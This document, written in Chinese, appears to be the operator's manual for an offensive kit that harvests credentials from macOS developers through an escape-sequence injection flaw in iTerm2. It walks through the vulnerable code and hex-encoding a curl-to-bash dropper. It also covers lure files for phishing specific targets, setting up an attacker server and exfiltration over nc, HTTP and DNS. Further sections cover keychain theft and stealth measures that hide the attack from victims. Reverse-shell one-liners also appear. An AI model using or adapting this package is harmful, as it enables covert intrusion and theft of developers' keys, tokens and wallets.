iTerm2 凭证收割包 — 技术说明

版本 1.0
日期 2026-11-22
目标 macOS 开发者工作站
入口 iTerm2 < 3.7.9 的 Kitty Image Protocol APC 注入漏洞

一、这是什么

一个投递包，包含：

组件 作用
诱饵文档 看起来正常的项目 README.md，内嵌 APC 转义序列
Dropper 22 字节的下载器，触发后拉取完整收集脚本
收集脚本 22 个模块，扫描本地能变现的凭证
接收端 服务端，接收打包后的数据

触发条件：受害者在 iTerm2 里 cat、less、git diff、git log -p 等任何方式显示文件内容。

不需要：执行文件、安装软件、admin 权限、绕过 Gatekeeper、用户点击确认。

二、技术原理

2.1 漏洞概述

漏洞类型   终端转义序列注入 → 任意命令执行
入口       iTerm2 的 Kitty 图像协议 APC 处理路径
影响版本   3.5.6 ~ 3.7.8（逐版本源码验证）
修复版本   3.7.9（2026-11-20）
披露       2026-11-21，研究者 ii4gsp
前提       iTerm2 默认配置，无需任何额外设置

版本范围（逐版本源码验证）

版本 Kitty 支持 sanitizer 状态
3.4.0 - 3.5.5 ✗ — 不受影响
3.5.6 - 3.5.14 ✓ ✗ 有漏洞
3.6.0 - 3.6.8 ✓ ✗ 有漏洞
3.7.0 - 3.7.8 ✓ ✗ 有漏洞
3.7.9 ✓ ✓ 已修复

关键修正：网上流传的「3.7.0 引入」是错的。实际 3.5.6 就有 Kitty 支持，只是 3.7.0 把文件从 sources/KittyImageController.swift 移到了 sources/InlineImages/KittyImageController.swift。

3.5.6 的 respondToTransmit 与 3.7.8 一字不差：

// 3.5.6 —— 与 3.7.8 完全相同
let payload = args.joined(separator: ",") + semi + (error ?? "OK")
let message = "\u{1B}_G\(payload)\u{1B}\\"
switch imageTransmission.verbosity {
case .normal:
    delegate?.kittyImageControllerReport(message: message)   // 总是发送

这意味着影响范围比最初判断的大得多：从 3.5.6 到 2026-11-20 之前的每一个版本都受影响。

2.2 三个缺陷的组合

漏洞由三个独立缺陷串联而成：

缺陷 1：APC 处理缺少信任检查

// sources/VT100/VT100Terminal.m
- (void)executeAPC:(VT100Token *)token {
    if (_tmuxMode) {
        [_delegate terminalSetWindowTitle:...];
        return;
    }
    if ([token.string hasPrefix:@"G"]) {          // ← 只检查 G 前缀
        iTermKittyImageCommand *command =
            [[iTermKittyImageCommand alloc] initWithAPCString:...];
        if (!command) return;
        [_delegate terminalDidReceiveKittyImageCommand:command];  // ← 直接执行
    }
}

关键：对比 OSC 序列的处理，OSC 有 terminalIsTrusted 检查，APC 完全没有。任何到达 VT100 parser 的 APC 都被无条件执行，不管来源是程序输出、文件内容、还是 SSH 远端。

3.7.9 也没有修复这一条。 修复只在响应路径上打补丁。

缺陷 2：Kitty 文件传输错误路径保留换行

// sources/InlineImages/KittyImageController.swift
private func handle(command: KittyImageCommand.ImageTransmission,
                    fileURL: URL,
                    query: Bool) -> String? {
    do {
        let values = try fileURL.resourceValues(forKeys: [.isRegularFileKey])  // ← 文件不存在则抛异常
        guard values.isRegularFile == true else { return "EBADF:Not a file" }
        guard filenameIsSafe(fileURL: fileURL) else { return "EBADF:Invalid path" }  // ← 永远走不到
        let content = try Data(contentsOf: fileURL)
        return handle(command: command, data: content, query: query)
    } catch {
        return "EBADF:\(error.localizedDescription)"   // ← 直接嵌入，保留换行
    }
}

三个连锁问题：

  1. resourceValues() 对不存在的文件抛异常
  2. filenameIsSafe() 在 guard 之后，永远不执行（死代码）
  3. error.localizedDescription 保留文件路径里的字面换行（0x0A）

macOS 的 NSError.localizedDescription 格式：

The file “<PATH>” couldn't be opened because there is no such file.
         ^^^^^^
         用 Unicode 曲引号 U+201C / U+201D

为什么用曲引号而不是 ASCII 双引号：如果错误消息里出现 ASCII "，bash 会进入双引号模式，换行不再是命令分隔符。曲引号不是 bash 的特殊字符，不触发引号模式。

缺陷 3：响应无条件写入 PTY stdin

// sources/InlineImages/KittyImageController.swift
func respondToTransmit(...) {
    let payload = args.joined(separator: ",") + semi + (error ?? "OK")
    let message = "\u{1B}_G\(payload)\u{1B}\\"

    switch imageTransmission.verbosity {
    case .normal:                                    // ← 默认值
        delegate?.kittyImageControllerReport(message: message)   // ← 总是发送
    ...
    }
}

// sources/PTYSession/PTYSession.m
- (void)screenSendReportData:(NSData *)data {
    if (_shell == nil) return;
    if (self.tmuxMode == TMUX_GATEWAY) return;
    [self writeLatin1EncodedData:data broadcastAllowed:NO reporting:YES];  // ← 写 PTY
}

关键：writeLatin1EncodedData: 走的是和键盘输入完全相同的路径。shell 会把这段数据当作「用户敲进来的内容」。

2.3 完整执行流

① 攻击者构建文件
   文本内容 + 隐藏的 APC 字节
   cat 时 APC 不可见（被 parser 消费）

② 受害者显示文件
   cat README.md  /  less  /  git diff  /  git log -p

③ iTerm2 VT100 parser
   正常文本 → 屏幕
   APC 字节 → executeAPC:

④ executeAPC: 无条件执行
   → KittyImageController.execute()
   → executeTransmitFile()  (t=f 参数)

⑤ base64 解码文件路径
   "/tmp/x" + LF + "<注入命令>" + LF + "z"

⑥ resourceValues() 失败
   文件不存在 → 抛异常

⑦ 构造错误消息
   "The file “/tmp/x\n<注入命令>\nz” couldn't be opened..."

⑧ respondToTransmit()
   verbosity = .normal → 总是发送

⑨ screenSendReportData()
   → writeLatin1EncodedData()
   → 写入 PTY stdin

⑩ shell 行规程按 LF 分割
   Line 1: \x1b_Gi=1;EBADF:The file “/tmp/x    ← 命令找不到，报错
   Line 2: <注入命令>                          ← 执行
   Line 3: z” couldn't be opened...\x1b\       ← 命令找不到，报错

2.4 为什么必须用 hex 包装

注入命令有两个硬约束：

约束 原因
不能含 / / 是 URL(fileURLWithPath:) 的路径分隔符，会切分路径，改变错误消息格式，破坏换行注入
不能含 ASCII " bash 会进入双引号模式，换行失效

这堵死了所有常规 payload：

bash -i >& /dev/tcp/IP/PORT 0>&1     ✗ 含 /
nc IP PORT -e /bin/bash              ✗ 含 /
cat ~/.ssh/id_ed25519                ✗ 含 /
curl https://attacker/collect        ✗ 含 /

绕过方案：整个脚本转成十六进制，用 xxd -r -p 还原。

echo 6375726c202d7320312e322e332e343a383038302f737c62617368|xxd -r -p|bash
  • 只含 0-9a-f、空格、管道符
  • 零个 /，零个 "
  • xxd 是 macOS 自带（vim 的一部分）

三、目标范围

3.1 适用目标画像

操作系统   macOS（任何版本）
终端       iTerm2 < 3.7.9
使用习惯   会 cat / less / git diff 查看文件
身份      开发者、运维、或者任何在终端里看代码的人

3.2 为什么选这个目标

· macOS 开发者几乎都用 iTerm2（Terminal.app 是少数）
· 开发者的机器上有大量凭证：SSH 私钥、云 AK、钱包、API token
· 开发者习惯 cat README / git diff / git log
· 这些动作都不触发任何安全警告

3.3 不适用的情况

· 用 Terminal.app（无 Kitty 协议支持）
· 已升级到 iTerm2 3.7.9+（响应被 sanitize）
· 用 tmux 且处于 tmux 模式（executeAPC 里 _tmuxMode 分支提前 return）
· 在 IDE 内置终端里看文件（VS Code / JetBrains 不用 iTerm2 的 parser）

5.3 诱饵设计原则

诱饵必须让他主动 cat。有效的场景：

✅ 看起来像他正在做的项目
   · Anubis 相关的 "dev-setup" 仓库
   · 他参与的开源项目的 "contributing guide"
   · 技术栈匹配的 "bootstrap" 脚本说明

✅ 有理由需要他执行
   · "先看 README，按步骤配置环境"
   · "这个 PR 修复了配置问题，请 review"

❌ 明显的钓鱼特征
   · 陌生人的奇怪链接
   · 附件名是 invoice / payment
   · 要求输入密码

5.4 传输安全性

实测六种传输方式：

传输方式 结果 原因
CRLF 转换（Outlook 等） ✓ 仍可注入 APC 的 base64 是纯 ASCII
7bit 转换 ✓ APC 本来就全是 7bit
quoted-printable ✓ 编解码正确还原
base64 ✓ 二进制安全
ZIP ✓ 二进制安全
剥离 ESC ✗ 定界符丢失

结论：普通邮件系统不会破坏 APC。只有「把 ESC 当垃圾字符删掉」的系统会让它失效，这种系统罕见。

最保险：用 ZIP 附件。

六、部署方案

6.1 服务端

┌──────────────────────────────────────┐
│  VPS（公网 IP）                       │
│                                       │
│  :8080  HTTP  提供 dropper 下载        │
│  :4444  TCP   接收 bundle.tgz          │
│  :8081  HTTP  接收 POST 上传           │
└──────────────────────────────────────┘

启动：

# 1. 准备 dropper
cp payload-full.sh s
sed -i 's/ATTACKER_IP/YOUR_IP/g; s/ATTACKER_PORT/4444/g; s/ATTACKER_IP:8080/YOUR_IP:8080/g' s

# 2. HTTP 服务（提供 dropper）
python -m http.server 8080

# 3. 接收端
python server.py --port 4444 --http-port 8081 --out ./loot

6.2 生成投递包

python delivery.py \
  --ip YOUR_IP \
  --port 8080 \
  --nc-port 4444 \
  --mode dropper \
  --all \
  --out ./delivery

输出：

delivery/
├── README.md                1,362 B   APC 135B   → Git 投递
├── dev-setup-setup.zip      1,742 B              → 邮件附件
├── README.b64               1,920 B              → 纯文本邮件
└── META.txt                                      元数据

6.3 Dropper 结构

原始：  curl -s YOUR_IP:8080/s|bash          (22 字节)
hex：   6375726c202d73...62617368            (44 字符)
包装：  echo <hex>|xxd -r -p|bash            (64 字符)
APC：   135 字节                              (远小于 4KB 上限)

为什么用 dropper 而不是内嵌全量脚本：

方案 APC 长度 说明
全量脚本内嵌 3,895 B 接近 4KB 上限，易被截断
dropper 135 B 3.2%，留 3,961 字节余量

6.4 外带通道（4 条，依次尝试）

① nc IP:4444 < bundle.tgz          直连，最快
② curl -F f=@bundle.tgz http://IP/u    HTTP POST
③ DNS 外带（< 2MB）                  base64 塞进 DNS 查询
④ 分段 HTTP（> 2MB）                 split + 逐个上传

八、双视角审计：暴露面 vs 失败点

从两个对立角度检查这个包 —— 受害者能不能发现，攻击者会失败在哪里。

已修复的三个高危项

V1 + V2：终端报错

原始三行报错：

$'\E_Gi=1': command not found        ← Line 1
EBADF:The: command not found         ← Line 1（分号分割）
z": command not found                ← Line 3

修复 1 — file_path 结尾 z → #

改前：/tmp/x + LF + <cmd> + LF + z
      Line 3 = z" couldn't be opened...     ← 报错

改后：/tmp/x + LF + <cmd> + LF + #
      Line 3 = #" couldn't be opened...     ← # 开头，注释，忽略

实测：报错 3 行 → 2 行，exit code 127 → 0。

修复 2 — 命令前加 clear;

Line 2 = clear; echo <hex>|xxd -r -p|bash

clear 输出 \033[H\033[2J\033[3J，在真实终端会清空屏幕 + 回滚缓冲。

实测 stdout：'\x1b[H\x1b[2J\x1b[3J<output>' —— 清屏序列确实在输出之前。

最终效果：受害者 cat 后屏幕被清空，只剩干净的提示符。

V5：钥匙串弹窗

原始每次调用都要求输入登录密码，这是最严重的暴露。

修复：只复制文件 + 2 秒超时

cp "$HOME/Library/Keychains/login.keychain-db" keychain/   # 加密文件，免授权
security dump-keychain 2>/dev/null > keychain/dump.txt &   # 后台
SEC_PID=$!; sleep 2; kill $SEC_PID 2>/dev/null

实测：keychain 模块从 13 个文件降到 3 个。

V6：屏幕截图

screencapture -x 只关声音，闪光还在。已直接移除。

8.5 一个反直觉的发现

Line 1 的报错无法消除。

file_path 不能以 # 开头，因为那会让 Line 1 变成：

\x1b_Gi=1;EBADF:The file "#...

# 前面有 \x1b_Gi=1;EBADF:The file "，这部分仍然被当命令执行。

根本原因：iTerm2 的响应格式是固定的（EBADF:<error>），前缀不受攻击者控制。

所以 Line 1 的报错只能靠 clear 覆盖，不能从源头消除。

九、检测与规避

8.1 受害者侧的可见痕迹

痕迹 是否可见
cat 输出 APC 字节不可见，输出正常
终端报错 会看到两行 command not found
执行时间 收集脚本 3-15 秒（取决于文件数）
网络连接 有出站连接，但只在执行期间
磁盘 临时目录 ~/.cache/.d<pid>，执行后删除

唯一明显的迹象：终端会闪两行 command not found。如果受害者注意，会发现异常。

缓解：在 payload 前面加 clear，或者用 echo 覆盖。

8.2 系统日志

· macOS 不记录 shell 命令历史（除非开了 auditd）
· 网络连接：不影响
· 文件访问：spotlight 索引可能记录，但不含内容
· 钥匙串访问：会弹窗（security 命令需要用户授权）

钥匙串访问是最大的风险 —— security dump-keychain 会弹窗要求密码。建议跳过或者只在用户离开时执行。

8.3 改进建议

· 检查屏幕锁定状态，锁定时执行
· 钥匙串 dump 放在最后，如果前面已经拿到足够数据就跳过
· 用 nohup 后台执行，避免阻塞终端
· 执行后 clear 屏幕

十二、快速开始

# 1. 改 IP
export ATTACKER_IP=1.2.3.4
export ATTACKER_PORT=4444
export HTTP_PORT=8080

# 2. 准备 dropper
cp payload-full.sh s
sed -i "s/ATTACKER_IP/${ATTACKER_IP}/g; s/ATTACKER_PORT/${ATTACKER_PORT}/g" s

# 3. 启动 HTTP
python -m http.server ${HTTP_PORT} &

# 4. 启动接收
python server.py --port ${ATTACKER_PORT} --http-port 8081 --out ./loot &

# 5. 生成投递包
python delivery.py --ip ${ATTACKER_IP} --port ${HTTP_PORT} \
  --nc-port ${ATTACKER_PORT} --mode dropper --all --out ./delivery

# 6. 投递 ./delivery/dev-setup-setup.zip 或 ./delivery/README.md

# 7. 收数据
ls -la ./loot/
